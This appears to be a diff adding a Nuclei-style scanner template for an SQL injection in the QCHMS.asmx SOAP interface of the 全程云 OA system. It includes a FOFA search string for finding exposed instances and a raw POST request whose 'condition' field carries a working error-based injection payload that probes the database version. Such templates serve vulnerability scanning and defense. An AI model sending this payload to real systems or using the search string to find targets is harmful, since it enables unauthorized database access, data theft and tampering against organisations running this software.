@@ -1,0 +1,44 @@
+id: quancheng-cloud-oa-qchms-sqli
+
+info:
+  name: "全程云OA系统 QCHMS.asmx 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="全程云-管理系统"
+      
+      全程云OA系统在QCHMS.asmx接口实现中存在SQL注入漏洞，攻击者可通过构造恶意输入参数绕过输入验证机制，向后端数据库注入任意SQL指令。该漏洞允许远程攻击者在未授权情况下执行数据库查询操作，可能导致敏感数据泄露、数据篡改或系统权限提升。
+  tags: 全程云OA系统
+
+http:
+- raw:
+  - |
+    POST /OA/HMS/QCHMS.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetProjectResumeList"
+    Accept-Encoding: gzip, deflate
+    Cookie: td_cookie=2806975495
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Language: zh-CN,zh;q=0.9
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+     <soap:Body>
+      <GetProjectResumeList xmlns="http://tempuri.org/">
+       <pageIndex>1</pageIndex>
+       <pageSize>20</pageSize>
+       <condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+
+    (SELECT (CASE WHEN (SUBSTRING(@@version,1,1)=CHAR(77)) THEN CHAR(49) ELSE CHAR(48) END))+
+    CHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>
+      </GetProjectResumeList>
+     </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'varchar'
